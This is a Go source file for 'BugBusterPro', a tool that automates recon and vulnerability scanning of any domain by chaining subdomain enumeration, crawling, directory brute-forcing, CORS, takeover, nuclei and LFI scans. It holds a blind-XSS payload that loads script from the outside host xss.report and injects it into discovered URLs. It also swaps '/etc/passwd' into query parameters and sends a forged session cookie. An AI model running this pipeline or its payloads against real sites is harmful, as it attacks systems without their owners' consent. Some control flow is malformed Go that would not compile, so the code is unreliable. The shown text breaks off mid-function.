package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

// --- Color Constants ---
const (
	colorReset  = "\033[0m"
	colorRed    = "\033[31m"
	colorGreen  = "\033[32m"
	colorYellow = "\033[33m"
	colorBlue   = "\033[34m"
	colorPurple = "\033[35m"
	colorCyan   = "\033[36m"
	colorWhite  = "\033[37m"
)

// --- Configuration Struct ---
type Config struct {
	Domain             string
	OutputDir          string
	WordlistPath       string // Path for feroxbuster wordlist
	NucleiTemplatesDir string // Path for Nuclei templates base directory
	InteractshServer   string // Custom Interactsh server URL (optional)
	Force              bool
	Threads            int // General thread/concurrency hint
	LogFile            *os.File
	Logger             *log.Logger
}

// --- StepInfo Struct ---
type StepInfo struct {
	Name         string
	Description  string
	Command      string
	OutputFile   string // File *expected* to be created by the command's redirection or -o flag
	RequiresPipe bool   // Flag to indicate if the command uses shell pipes/redirection
	Completed    bool
}

// --- Required Tools ---
var requiredTools = []string{
	"go", "subfinder", "httpx", "katana", "waybackurls", "otxurls",
	"feroxbuster", "nuclei", "subzy", "qsreplace", "gf", "bxss",
	"sort", "grep", "cat", "sh", "echo",
	"python3", "pip3", // Added for Corsy
}

func main() {
	// --- Command-Line Flags ---
	domain := flag.String("domain", "", "Target domain to scan (required)")
	outputDir := flag.String("output-dir", "output", "Directory to store scan results")

	// Wordlist Path Logic (same as v1.1.1)
	defaultWordlist := "common.txt"
	snapWordlistPath := "/snap/seclists/current/Discovery/Web-Content/common.txt"
	usrShareSecListsWordlistPath := "/usr/share/seclists/Discovery/Web-Content/common.txt"
	usrShareDirbWordlistPath := "/usr/share/wordlists/dirb/common.txt"
	if _, err := os.Stat(snapWordlistPath); err == nil {
		defaultWordlist = snapWordlistPath
	} else if _, err := os.Stat(usrShareSecListsWordlistPath); err == nil {
		defaultWordlist = usrShareSecListsWordlistPath
	} else if _, err := os.Stat(usrShareDirbWordlistPath); err == nil {
		defaultWordlist = usrShareDirbWordlistPath
	}
	wordlistPath := flag.String("wordlist", defaultWordlist, "Path to wordlist for directory brute-forcing")

	nucleiTemplatesDir := flag.String("nuclei-templates-dir", "/opt/nuclei-templates/", "Base directory for Nuclei templates")
	interactshServer := flag.String("interactsh-server", "", "Custom Interactsh server URL (e.g., https://your-server.com) - optional")
	force := flag.Bool("force", false, "Force rerun of all steps, even if output files exist")
	// Defaulting threads based on user's initial run command
	threads := flag.Int("threads", 100, "Default number of threads/concurrency for tools")
	flag.Parse()

	if *domain == "" {
		fmt.Println(colorRed + "Error: --domain is required." + colorReset)
		flag.Usage()
		os.Exit(1)
	}

	// --- Create Config ---
	config := Config{
		Domain:             *domain,
		OutputDir:          filepath.Clean(*outputDir),
		WordlistPath:       *wordlistPath,
		NucleiTemplatesDir: *nucleiTemplatesDir,
		InteractshServer:   *interactshServer, // Store interactsh URL
		Force:              *force,
		Threads:            *threads,
	}

	// --- Initialization ---
	if err := initialize(&config); err != nil {
		fmt.Printf(colorRed+"Initialization failed: %v\n"+colorReset, err)
		os.Exit(1)
	}
	defer func() {
		if config.LogFile != nil {
			config.LogFile.Close()
		}
	}()

	// --- Check & Install Tools ---
	if !checkAndInstallTools(&config) {
		config.Logger.Println(colorRed + "Required tools check failed. Please install missing tools manually and try again." + colorReset)
		os.Exit(1)
	}

	// --- Create Directories ---
	createDirectories(&config)

	// --- Define Steps ---
	steps := defineSteps(&config)

	// --- Run Steps ---
	runAllSteps(&config, steps)

	// --- Print Summary ---
	printSummary(&config, steps)

	config.Logger.Println(colorGreen + "\nBugBusterPro finished." + colorReset)
}

// --- initialize: Set up logging and print banner ---
func initialize(config *Config) error {
	// Create base output directory first
	err := os.MkdirAll(config.OutputDir, 0755)
	if err != nil {
		return fmt.Errorf("error creating base output directory %s: %v", config.OutputDir, err)
	}

	logsDir := filepath.Join(config.OutputDir, "logs")
	err = os.MkdirAll(logsDir, 0755)
	if err != nil {
		return fmt.Errorf("error creating logs directory %s: %v", logsDir, err)
	}

	logFileName := filepath.Join(logsDir, fmt.Sprintf("bugbusterpro_%s_%s.log", config.Domain, time.Now().Format("20060102_150405")))
	logFile, err := os.Create(logFileName)
	if err != nil {
		return fmt.Errorf("error creating log file %s: %v", logFileName, err)
	}

	multiWriter := io.MultiWriter(os.Stdout, logFile)
	logger := log.New(multiWriter, "", log.Ldate|log.Ltime|log.Lmicroseconds)

	config.LogFile = logFile
	config.Logger = logger

	printBanner(config) // Print banner AFTER logger is set up

	// Log config details
	config.Logger.Printf("Output directory: %s", config.OutputDir)
	config.Logger.Printf("Force rerun: %t", config.Force)
	config.Logger.Printf("Default Threads/Concurrency: %d", config.Threads)
	config.Logger.Printf("Log file: %s", config.LogFile.Name())


	// Check wordlist existence
	if _, err := os.Stat(config.WordlistPath); os.IsNotExist(err) {
		config.Logger.Printf(colorYellow+"Warning: Specified wordlist '%s' not found. Directory brute-forcing (Step 11) might fail.", config.WordlistPath+colorReset)
		config.Logger.Printf(colorYellow+"Use the --wordlist flag to specify the correct path."+colorReset)
	} else {
		config.Logger.Printf("Using wordlist: %s", config.WordlistPath)
	}

	// Check Nuclei templates directory existence
	if _, err := os.Stat(config.NucleiTemplatesDir); os.IsNotExist(err) {
		config.Logger.Printf(colorYellow+"Warning: Specified Nuclei templates directory '%s' not found. Nuclei scans might fail.", config.NucleiTemplatesDir+colorReset)
		config.Logger.Printf(colorYellow+"Ensure templates are present or use the --nuclei-templates-dir flag. Run 'nuclei -update-templates -td %s' manually if needed.", config.NucleiTemplatesDir+colorReset)
	} else {
		config.Logger.Printf("Using Nuclei templates directory: %s", config.NucleiTemplatesDir)
		config.Logger.Printf(colorYellow+"Note: Ensure Nuclei templates are up-to-date by running: nuclei -update-templates -td %s"+colorReset, config.NucleiTemplatesDir)
	}

    // Log Interactsh server if provided
    if config.InteractshServer != "" {
        config.Logger.Printf("Using custom Interactsh server: %s", config.InteractshServer)
    }


	return nil
}

// --- printBanner: Display the tool's banner ---
func printBanner(config *Config) {
	banner := `
██████╗ ██╗   ██╗ ██████╗ ██████╗ ██╗   ██╗███████╗████████╗███████╗██████╗ ██████╗ ██████╗  ██████╗
██╔══██╗██║   ██║██╔════╝ ██╔══██╗██║   ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔═══██╗
██████╔╝██║   ██║██║  ███╗██████╔╝██║   ██║███████╗   ██║   █████╗  ██████╔╝██████╔╝██████╔╝██║   ██║
██╔══██╗██║   ██║██║   ██║██╔══██╗██║   ██║╚════██║   ██║   ██╔══╝  ██╔══██╗██╔═══╝ ██╔══██╗██║   ██║
██████╔╝╚██████╔╝╚██████╔╝██████╔╝╚██████╔╝███████║   ██║   ███████╗██║  ██║██║     ██║  ██║╚██████╔╝
╚═════╝  ╚═════╝  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝
                                                                                         v1.2.0 (Workflow Update)
`
	fmt.Println(colorCyan + banner + colorReset)
	config.Logger.Printf("Starting BugBusterPro for domain: %s", config.Domain)
	// Other config details logged in initialize()
}

// --- checkAndInstallTools: Verify required tools, attempt installation ---
func checkAndInstallTools(config *Config) bool {
	config.Logger.Println(colorYellow + "Checking required tools..." + colorReset)
	allToolsFound := true
	goInstalled := isToolInstalled("go")
	python3Installed := isToolInstalled("python3")
	pip3Installed := isToolInstalled("pip3")

	// Check for Python/Pip first if needed
	if !python3Installed {
		config.Logger.Printf(colorRed + "Tool python3 not found. Please install Python 3." + colorReset)
		allToolsFound = false // Corsy needs python3
	}
	if !pip3Installed {
		config.Logger.Printf(colorYellow + "Tool pip3 not found. Cannot automatically install Python packages like 'corsy'. Please install pip3." + colorReset)
		// Don't set allToolsFound to false here, maybe corsy is already installed system-wide
	}


	for _, tool := range requiredTools {
		if !isToolInstalled(tool) {
			isGoTool := contains([]string{"subfinder", "httpx", "katana", "waybackurls", "otxurls", "nuclei", "subzy", "qsreplace", "gf", "bxss"}, tool)
			isInstallablePkg := contains([]string{"feroxbuster"}, tool)
			isPipInstallable := contains([]string{"corsy"}, tool) // Assuming corsy is pip installable

			if tool == "go" {
				config.Logger.Printf(colorRed+"Tool %s not found. Please install Go manually (https://golang.org/doc/install)."+colorReset, tool)
				allToolsFound = false
			} else if isGoTool {
				if !goInstalled {
					config.Logger.Printf(colorRed+"Tool %s not found, and Go is not installed. Cannot install automatically."+colorReset, tool)
					allToolsFound = false
				} else {
					config.Logger.Printf(colorYellow+"Tool %s not found. Attempting installation via 'go install'..."+colorReset, tool)
					if !installTool(config, tool) { allToolsFound = false }
				}
			} else if isInstallablePkg {
				config.Logger.Printf(colorYellow+"Tool %s not found. Attempting installation via package manager or cargo..."+colorReset, tool)
				if !installTool(config, tool) { allToolsFound = false }
			} else if isPipInstallable {
				if python3Installed && pip3Installed {
					config.Logger.Printf(colorYellow+"Tool/Package %s not found. Attempting installation via 'pip3 install'..."+colorReset, tool)
					if !installTool(config, tool) {
						// Don't necessarily fail the whole run if corsy install fails, maybe user doesn't need it
						config.Logger.Printf(colorYellow+"Failed to automatically install %s via pip3. Step requiring it might fail."+colorReset, tool)
					}
				} else {
                     config.Logger.Printf(colorRed+"Cannot attempt pip3 install for %s because python3 or pip3 is missing."+colorReset, tool)
                }
			} else if tool == "python3" || tool == "pip3" {
                 // Already handled above
                 continue
            } else { // Basic utils
				config.Logger.Printf(colorRed+"Required utility '%s' not found in PATH. Please install it using your system's package manager."+colorReset, tool)
				allToolsFound = false
			}
		} else {
			config.Logger.Printf(colorGreen+"Tool %s found."+colorReset, tool)
		}
	}

	if !allToolsFound {
		config.Logger.Println(colorRed + "One or more critical tools (Go, Python3, basic utils) are missing or could not be installed." + colorReset)
	} else {
		config.Logger.Println(colorGreen + "Required tools check completed." + colorReset)
	}
	return allToolsFound
}

// --- isToolInstalled: Check if command exists in PATH ---
func isToolInstalled(tool string) bool {
	_, err := exec.LookPath(tool)
	// Special check for corsy - might be installed but not directly in PATH
	if tool == "corsy" && err != nil {
		// Try running 'python3 -m corsy --help' as a check
		cmd := exec.Command("python3", "-m", "corsy", "--help")
		errCheck := cmd.Run()
		return errCheck == nil
	}
	return err == nil
}


// --- installTool: Attempt to install a missing tool ---
func installTool(config *Config, tool string) bool {
	config.Logger.Printf("Attempting to install %s...", tool)
	var cmd *exec.Cmd
	installSuccess := false

	// Determine the installation command
	switch tool {
	// --- Go Tools --- (Same as v1.1.1)
	case "subfinder": cmd = exec.Command("go", "install", "-v", "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest")
	case "httpx": cmd = exec.Command("go", "install", "-v", "github.com/projectdiscovery/httpx/cmd/httpx@latest")
	case "katana": cmd = exec.Command("go", "install", "-v", "github.com/projectdiscovery/katana/cmd/katana@latest")
	case "waybackurls": cmd = exec.Command("go", "install", "-v", "github.com/tomnomnom/waybackurls@latest")
	case "otxurls": cmd = exec.Command("go", "install", "-v", "github.com/lc/otxurls@latest")
	case "nuclei": cmd = exec.Command("go", "install", "-v", "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest")
	case "subzy": cmd = exec.Command("go", "install", "-v", "github.com/LukaSikic/subzy@latest")
	case "qsreplace": cmd = exec.Command("go", "install", "-v", "github.com/tomnomnom/qsreplace@latest")
	case "gf":
		cmd = exec.Command("go", "install", "-v", "github.com/tomnomnom/gf@latest")
		defer func() {
			if isToolInstalled("gf") { config.Logger.Printf(colorYellow + "Note: 'gf' installed. Ensure you have gf patterns setup (e.g., from https://github.com/tomnomnom/gf)." + colorReset) }
		}()
	case "bxss": cmd = exec.Command("go", "install", "-v", "github.com/ethicalhackingplayground/bxss@latest")

	// --- Other Tools ---
	case "feroxbuster": // Same logic as v1.1.1
		pkgManagers := []struct{ name string; updateCmd []string; installCmd []string }{
			{"apt-get", []string{"sudo", "apt-get", "update"}, []string{"sudo", "apt-get", "install", "-y", "feroxbuster"}},
			{"yum", nil, []string{"sudo", "yum", "install", "-y", "feroxbuster"}},
			{"dnf", nil, []string{"sudo", "dnf", "install", "-y", "feroxbuster"}},
			{"pacman", []string{"sudo", "pacman", "-Sy"}, []string{"sudo", "pacman", "-S", "--noconfirm", "feroxbuster"}},
		}
		installedViaPkg := false
		for _, pm := range pkgManagers {
			if isToolInstalled(pm.name) {
				config.Logger.Printf("Trying to install feroxbuster using %s...", pm.name)
				if pm.updateCmd != nil { runInstallCommand(config, exec.Command(pm.updateCmd[0], pm.updateCmd[1:]...), tool+" ("+pm.name+" update)") }
				if err := runInstallCommand(config, exec.Command(pm.installCmd[0], pm.installCmd[1:]...), tool+" ("+pm.name+" install)"); err == nil {
					installSuccess = true; installedViaPkg = true; break
				}
			}
		}
		if !installedViaPkg {
			if isToolInstalled("cargo") {
				config.Logger.Printf("Trying to install feroxbuster using cargo...")
				cmd = exec.Command("cargo", "install", "feroxbuster")
			} else {
				config.Logger.Printf(colorRed + "Cannot install feroxbuster automatically: No supported package manager or cargo found." + colorReset); return false
			}
		}

	case "corsy": // Pip installation
		// Try simple install first, then user install if needed
		cmdPip := exec.Command("pip3", "install", "corsy")
        if err := runInstallCommand(config, cmdPip, tool + " (pip3 system)"); err != nil {
            config.Logger.Printf(colorYellow+"System pip3 install for %s failed, trying user install..." + colorReset, tool)
            cmdPipUser := exec.Command("pip3", "install", "--user", "corsy")
            if errUser := runInstallCommand(config, cmdPipUser, tool + " (pip3 user)"); errUser != nil {
                 config.Logger.Printf(colorRed+"User pip3 install for %s also failed." + colorReset, tool)
                 return false // Both failed
            } else {
                // Add reminder about user bin path
                homeDir, _ := os.UserHomeDir()
                if homeDir != "" {
                     config.Logger.Printf(colorYellow+"Note: %s installed via pip3 --user. Ensure '%s/.local/bin' is in your PATH."+colorReset, tool, homeDir)
                }
                 installSuccess = true // User install worked
            }
        } else {
             installSuccess = true // System install worked
        }
		cmd = nil // Mark cmd as nil since pip handled it

	default:
		config.Logger.Printf(colorRed+"Unknown tool for installation: %s"+colorReset, tool)
		return false
	}

	// --- Execute Go/Cargo Command (if determined) ---
	if cmd != nil {
		homeDir, err := os.UserHomeDir()
		if err == nil {
			cmd.Env = append(os.Environ(), "HOME="+homeDir)
			goPath := os.Getenv("GOPATH"); if goPath == "" { goPath = filepath.Join(homeDir, "go") }
			goBin := filepath.Join(goPath, "bin"); cmd.Env = append(cmd.Env, "PATH="+os.Getenv("PATH")+":"+goBin)
		}
		if err := runInstallCommand(config, cmd, tool); err != nil { return false }
	} else if !installSuccess && tool != "corsy" { // Only fail if not handled by pip/pkg and not corsy
         config.Logger.Printf(colorRed+"Failed to determine or execute an installation method for %s."+colorReset, tool)
         return false
    }

	// --- Post-Installation Verification ---
	time.Sleep(1 * time.Second)
	if isToolInstalled(tool) {
		config.Logger.Printf(colorGreen+"Successfully installed/verified %s"+colorReset, tool)
		if tool == "nuclei" {
			config.Logger.Printf(colorYellow+"Running 'nuclei -update-templates -td %s'..." + colorReset, config.NucleiTemplatesDir)
			_ = os.MkdirAll(config.NucleiTemplatesDir, 0755)
			updateCmd := exec.Command("nuclei", "-update-templates", "-td", config.NucleiTemplatesDir)
			runInstallCommand(config, updateCmd, "nuclei-templates update")
		}
		return true
	} else {
		// Don't fail hard for corsy if verification fails, maybe it's installed differently
        if tool == "corsy" {
            config.Logger.Printf(colorYellow+"Could not verify %s installation via PATH or 'python3 -m corsy'. The step requiring it might fail."+colorReset, tool)
            return true // Allow script to continue
        }
		config.Logger.Printf(colorRed+"Installation of %s seems to have failed (command not found after install attempt). Check logs above."+colorReset, tool)
		return false
	}
}


// runInstallCommand (same as v1.1.1 - executes command, logs output/errors)
func runInstallCommand(config *Config, cmd *exec.Cmd, logPrefix string) error {
	var outb, errb bytes.Buffer
	cmd.Stdout = &outb
	cmd.Stderr = &errb
	config.Logger.Printf("Running command for '%s': %s", logPrefix, cmd.String())
	err := cmd.Run()
	stdoutStr := strings.TrimSpace(outb.String())
	stderrStr := strings.TrimSpace(errb.String())
	if stdoutStr != "" {
		scanner := bufio.NewScanner(strings.NewReader(stdoutStr))
		for scanner.Scan() { config.Logger.Printf("[%s stdout] %s", logPrefix, scanner.Text()) }
	}
	if stderrStr != "" {
		scanner := bufio.NewScanner(strings.NewReader(stderrStr))
		for scanner.Scan() { config.Logger.Printf(colorYellow+"[%s stderr] %s"+colorReset, logPrefix, scanner.Text()) }
	}
	if err != nil {
		config.Logger.Printf(colorRed+"Command for '%s' failed: %v"+colorReset, logPrefix, err)
		return err
	}
	// config.Logger.Printf("Command for '%s' completed successfully.", logPrefix) // Reduce verbosity
	return nil
}


// --- createDirectories (same as v1.1.1) ---
func createDirectories(config *Config) {
	dirs := []string{"subfinder", "httpx", "urls", "js", "findings", "feroxbuster"}
	config.Logger.Println(colorBlue + "Creating output subdirectories..." + colorReset)
	for _, dir := range dirs {
		dirPath := filepath.Join(config.OutputDir, dir)
		if err := os.MkdirAll(dirPath, 0755); err != nil {
			config.Logger.Printf(colorRed+"Error creating directory %s: %v"+colorReset, dirPath, err)
		}
	}
	config.Logger.Printf("Output subdirectories checked/created in: %s", config.OutputDir)
}


// --- defineSteps: Configure all scanning steps based on user workflow ---
func defineSteps(config *Config) []StepInfo {
	// Define file paths
	subfinderOutput := filepath.Join(config.OutputDir, "subfinder", "subdomains.txt")
	httpxOutput := filepath.Join(config.OutputDir, "httpx", "alive_urls.txt") // URLs with scheme
	httpxHostsOutput := filepath.Join(config.OutputDir, "httpx", "alive_hosts.txt") // Just host:port
	corsyOutput := filepath.Join(config.OutputDir, "findings", "corsy.txt")
	urlsDir := filepath.Join(config.OutputDir, "urls")
	katanaOutput := filepath.Join(urlsDir, "katana_crawl.txt") // From initial crawl
	waybackOutput := filepath.Join(urlsDir, "wayback.txt")
	otxOutput := filepath.Join(urlsDir, "otx.txt")
	allUrlsUnsorted := filepath.Join(urlsDir, "all_urls_unsorted.txt")
	allUrlsSorted := filepath.Join(urlsDir, "all_urls_sorted_unique.txt") // Main URL list
	secretsOutput := filepath.Join(config.OutputDir, "findings", "potential_secrets.txt")
	jsDir := filepath.Join(config.OutputDir, "js")
	jsFileUrlsFromGrep := filepath.Join(jsDir, "js_files_grep.txt")
	jsFindingsOutput := filepath.Join(config.OutputDir, "findings", "js_nuclei_findings.txt")
	jsKatanaPipelineOutput := filepath.Join(jsDir, "js_files_katana_pipeline.txt")
	jsKatanaPipelineFindingsOutput := filepath.Join(config.OutputDir, "findings", "js_katana_pipeline_nuclei.txt")
	feroxbusterDirOutput := filepath.Join(config.OutputDir, "feroxbuster")
	feroxbusterFileOutput := filepath.Join(feroxbusterDirOutput, fmt.Sprintf("feroxbuster_%s.txt", strings.ReplaceAll(config.Domain, ".", "_")))
	xssOutput := filepath.Join(config.OutputDir, "findings", "xss_bxss.txt")
	takeoverOutput := filepath.Join(config.OutputDir, "findings", "takeovers_subzy.txt")
	misconfigsOutput := filepath.Join(config.OutputDir, "findings", "misconfigs_nuclei.json")
	nucleiFindingsOutput := filepath.Join(config.OutputDir, "findings", "nuclei_findings.json") // Changed to JSON
	lfiOutput := filepath.Join(config.OutputDir, "findings", "lfi_nuclei.json")

    // Optional Interactsh flag for Nuclei
    interactshFlag := ""
    if config.InteractshServer != "" {
        // Nuclei v3 uses -iserver, older might use -interactsh-url. Using -iserver.
        interactshFlag = fmt.Sprintf("-iserver %s", config.InteractshServer)
    }

	// Define Steps (17 total now)
	steps := []StepInfo{
		// --- Discovery ---
		{ // Step 1
			Name:        "1. Subdomain Discovery (subfinder)",
			Description: "Discovering subdomains using subfinder",
			Command:     fmt.Sprintf("subfinder -d %s -o %s -all -recursive -silent", config.Domain, subfinderOutput),
			OutputFile:  subfinderOutput,
		},
		{ // Step 2
			Name:        "2. Subdomain Probing (httpx)",
			Description: "Probing discovered subdomains for live HTTP/S servers",
			Command: fmt.Sprintf("cat %s | httpx -ports 80,443,8080,8443,8000,8888 -threads %d -timeout 10 -silent -o %s -output-host-port %s",
				subfinderOutput, config.Threads, httpxOutput, httpxHostsOutput),
			OutputFile:   httpxOutput, // Check the URL list file
			RequiresPipe: true,
		},
        { // Step 3 - NEW Corsy Scan
            Name:        "3. CORS Misconfiguration Scan (Corsy)",
            Description: "Checking alive URLs for CORS issues using Corsy",
            // Assuming corsy is installed and runnable via python3 -m corsy
            // Using -i for input file, -t for threads, redirecting output
            Command: fmt.Sprintf("python3 -m corsy -i %s -t %d --headers \"User-Agent: GoogleBot\\nCookie: SESSION=Hacked\" > %s",
                         httpxOutput, config.Threads/2, corsyOutput), // Lower threads for python tool maybe
            OutputFile:   corsyOutput,
            RequiresPipe: true, // Uses redirection >
        },

		// --- URL Gathering ---
		{ // Step 4
			Name:        "4. URL Crawling (Katana)",
			Description: "Crawling live sites found by httpx using Katana",
			Command: fmt.Sprintf("katana -list %s -d 5 -jc -kf -c %d -silent -ef woff,css,png,jpg,svg,ico,gif,jpeg,ttf,otf,eot -o %s",
				httpxOutput, config.Threads, katanaOutput),
			OutputFile: katanaOutput,
		},
		{ // Step 5
			Name:        "5. URL Archival (Waybackurls)",
			Description: "Fetching URLs from Wayback Machine for the root domain",
			Command:      fmt.Sprintf("echo %s | waybackurls > %s", config.Domain, waybackOutput),
			OutputFile:   waybackOutput,
			RequiresPipe: true,
		},
		{ // Step 6
			Name:        "6. URL Archival (OTX)",
			Description: "Fetching URLs from AlienVault OTX for the root domain",
			Command:      fmt.Sprintf("echo %s | otxurls -s > %s", config.Domain, otxOutput), // Added -s for subdomains based on user cmd list
			OutputFile:   otxOutput,
			RequiresPipe: true,
		},
		{ // Step 7
			Name:        "7. Consolidate & Sort URLs",
			Description: "Combining URLs from Katana, Wayback, OTX, sorting, and removing duplicates",
			// Combining katana, wayback, otx outputs
			Command: fmt.Sprintf("cat %s %s %s > %s && cat %s | sort -u > %s",
				katanaOutput, waybackOutput, otxOutput, allUrlsUnsorted, allUrlsUnsorted, allUrlsSorted),
			OutputFile:   allUrlsSorted,
			RequiresPipe: true,
		},

		// --- Initial Analysis ---
		{ // Step 8
			Name:        "8. Secret Files Discovery (grep)",
			Description: "Searching consolidated URLs for potentially sensitive file extensions",
			Command: fmt.Sprintf("cat %s | grep -E '\\.(log|txt|config|conf|cfg|ini|yml|yaml|json|sql|db|backup|bak|bkp|old|cache|secret|key|pem|csv|xls|xlsx|gz|tgz|zip|rar|7z)$' > %s",
				allUrlsSorted, secretsOutput),
			OutputFile:   secretsOutput,
			RequiresPipe: true,
		},
		{ // Step 9
			Name:        "9. JavaScript Files Collection (grep)",
			Description: "Extracting JavaScript file URLs from the consolidated list",
			Command: fmt.Sprintf("cat %s | grep -E '\\.js$' > %s",
				allUrlsSorted, jsFileUrlsFromGrep),
			OutputFile:   jsFileUrlsFromGrep,
			RequiresPipe: true,
		},
		{ // Step 10
			Name:        "10. JavaScript Analysis from Grep (Nuclei)",
			Description: "Analyzing grep'd JavaScript files for exposures/secrets",
			Command: fmt.Sprintf("nuclei -l %s -td %s -t exposures/,javascript/ -tags js,secret -severity medium,high,critical -c %d -stats -o %s",
				jsFileUrlsFromGrep, config.NucleiTemplatesDir, config.Threads, jsFindingsOutput),
			OutputFile: jsFindingsOutput,
		},
        { // Step 11 - NEW Katana JS Pipeline
             Name:        "11. JavaScript Analysis from Katana Pipeline (Nuclei)",
             Description: "Using Katana probe+spider (-ps) to find JS and analyze with Nuclei",
             // Output JS files found by katana -ps to a temp file, then feed to nuclei
             Command: fmt.Sprintf("echo %s | katana -ps -silent -ef woff,css,png,jpg,svg,ico,gif,jpeg,ttf,otf,eot | grep -E '\\.js$' > %s && nuclei -l %s -td %s -t exposures/,javascript/ -tags js,secret -severity medium,high,critical -c %d -stats -o %s",
                         config.Domain, jsKatanaPipelineOutput, jsKatanaPipelineOutput, config.NucleiTemplatesDir, config.Threads, jsKatanaPipelineFindingsOutput),
             OutputFile:   jsKatanaPipelineFindingsOutput, // Check the final nuclei output
             RequiresPipe: true, // Uses echo, pipe, grep, redirect, nuclei
        },


		// --- Active Scanning ---
		{ // Step 12
			Name:        "12. Directory Bruteforce (feroxbuster)",
			Description: "Bruteforcing directories and files on live web servers",
			// Using host:port list, configurable wordlist, no-recursion added
			// Updated extensions list slightly based on user input
			Command: fmt.Sprintf("feroxbuster --stdin --wordlist %s --threads %d --depth 3 --no-recursion -x php,config,log,sql,bak,old,conf,backup,sub,db,asp,aspx,py,rb,cache,cgi,csv,htm,inc,jar,js,json,jsp,lock,rar,swp,txt,wadl,xml,tar.gz,tar.bz2 --status-codes 200,301,302,401 --filter-status 404,403,500 --silent --output %s < %s",
				config.WordlistPath, config.Threads, feroxbusterFileOutput, httpxHostsOutput),
			OutputFile:   feroxbusterFileOutput,
			RequiresPipe: true,
		},
		{ // Step 13
			Name:        "13. XSS Scan (gf + bxss)",
			Description: "Scanning found URLs for potential XSS using gf patterns and bxss",
			// Use sorted URLs, gf xss pattern, bxss with user's payload
			Command: fmt.Sprintf("cat %s | gf xss | bxss -append -payload '<script/src=//xss.report/c/coffinpx></script>' -threads %d > %s",
				allUrlsSorted, config.Threads, xssOutput),
			OutputFile:   xssOutput,
			RequiresPipe: true,
		},
		{ // Step 14
			Name:        "14. Subdomain Takeover Check (subzy)",
			Description: "Checking discovered subdomains for potential takeover vulnerabilities",
			Command: fmt.Sprintf("subzy run --targets %s --concurrency %d --hide_fails --verify_ssl --output %s",
				subfinderOutput, config.Threads*2, takeoverOutput), // Maybe more concurrency here
			OutputFile: takeoverOutput,
		},
		{ // Step 15 - Updated Nuclei Misconfig
			Name:        "15. Misconfiguration Scan (Nuclei)",
			Description: "Scanning live hosts for CORS and common misconfigurations",
			// Using user's tags, interactsh flag, validate flag
			Command: fmt.Sprintf("nuclei -l %s -td %s -tags cors,misconfig -severity medium,high,critical -rate-limit 150 -c %d -timeout 15 -stats -irr -validate %s -j -o %s",
				httpxOutput, config.NucleiTemplatesDir, config.Threads, interactshFlag, misconfigsOutput),
			OutputFile: misconfigsOutput,
		},
		{ // Step 16 - Updated Nuclei CVE/Tech
			Name:        "16. CVEs & Tech Scan (Nuclei)",
			Description: "Scanning for known CVEs, technology detection, and OSINT",
			// Outputting to JSON
			Command: fmt.Sprintf("nuclei -l %s -td %s -tags cve,tech,osint -severity medium,high,critical,info -etags ssl -c %d -stats -j -o %s",
				httpxOutput, config.NucleiTemplatesDir, config.Threads, nucleiFindingsOutput),
			OutputFile: nucleiFindingsOutput,
		},
		{ // Step 17 - Updated Nuclei LFI
			Name:        "17. LFI Scan (gf + qsreplace + Nuclei)",
			Description: "Testing filtered URLs for potential Local File Inclusion vulnerabilities",
			// Using gf lfi pattern
			Command: fmt.Sprintf("cat %s | gf lfi | qsreplace '/etc/passwd' | nuclei -td %s -tags lfi,file-inclusion -severity medium,high,critical -c %d -stats -irr %s -j -o %s",
				allUrlsSorted, config.NucleiTemplatesDir, config.Threads, interactshFlag, lfiOutput),
			OutputFile:   lfiOutput,
			RequiresPipe: true,
		},
	}

	return steps
}


// --- runAllSteps (same as v1.1.1 - executes steps sequentially) ---
func runAllSteps(config *Config, steps []StepInfo) {
	totalSteps := len(steps)
	for i := range steps {
		step := &steps[i]
		config.Logger.Printf(colorCyan+"[%d/%d] Starting: %s"+colorReset, i+1, totalSteps, step.Name)
		config.Logger.Printf(colorBlue+"--> Description: %s"+colorReset, step.Description)
		config.Logger.Printf(colorBlue+"--> Output File: %s"+colorReset, step.OutputFile)
		outputExists := fileExists(step.OutputFile)
		outputNotEmpty := isStepCompleted(step.OutputFile)
		if !config.Force && outputNotEmpty {
			config.Logger.Printf(colorYellow+"Skipping: Output file '%s' already exists and is not empty. Use --force to rerun."+colorReset, step.OutputFile)
			step.Completed = true; config.Logger.Println("---"); continue
		}
        if config.Force && outputExists { config.Logger.Printf(colorYellow+"Note: --force is enabled, rerunning step even though output '%s' exists."+colorReset, step.OutputFile) }
        else if !config.Force && outputExists && !outputNotEmpty { config.Logger.Printf(colorYellow+"Note: Output file '%s' exists but is empty. Rerunning step."+colorReset, step.OutputFile) }
		outputDir := filepath.Dir(step.OutputFile)
		if err := os.MkdirAll(outputDir, 0755); err != nil {
			config.Logger.Printf(colorRed+"Error: Cannot create output directory '%s' for step %d: %v. Skipping step."+colorReset, outputDir, i+1, err)
			step.Completed = false; config.Logger.Println("---"); continue
		}
		startTime := time.Now()
		err := runStep(config, *step)
		duration := time.Since(startTime)
		if err != nil {
			config.Logger.Printf(colorRed+"Error running step [%d/%d] %s: %v (Duration: %s)"+colorReset, i+1, totalSteps, step.Name, err, duration.Round(time.Second))
			step.Completed = false
            if fileExists(step.OutputFile) && !isStepCompleted(step.OutputFile) { config.Logger.Printf(colorYellow+"Note: Output file '%s' was created but is empty, likely due to the error."+colorReset, step.OutputFile) }
		} else {
			if !isStepCompleted(step.OutputFile) {
				config.Logger.Printf(colorYellow+"Warning: Step [%d/%d] %s completed without errors, but output file '%s' is missing or empty. (Duration: %s)"+colorReset, i+1, totalSteps, step.Name, step.OutputFile, duration.Round(time.Second))
				step.Completed = true
			} else {
				config.Logger.Printf(colorGreen+"Success: Step [%d/%d] %s completed successfully. (Duration: %s)"+colorReset, i+1, totalSteps, step.Name, duration.Round(time.Second))
				step.Completed = true
			}
		}
		config.Logger.Println("---")
	}
}


// --- fileExists (same as v1.1.1) ---
func fileExists(filePath string) bool { _, err := os.Stat(filePath); return err == nil }

// --- isStepCompleted (same as v1.1.1) ---
func isStepCompleted(outputFile string) bool { info, err := os.Stat(outputFile); return err == nil && info.Size() > 0 }

// --- runStep (same as v1.1.1 - executes sh -c or direct command) ---
func runStep(config *Config, step StepInfo) error {
	config.Logger.Printf("Executing command: %s", step.Command)
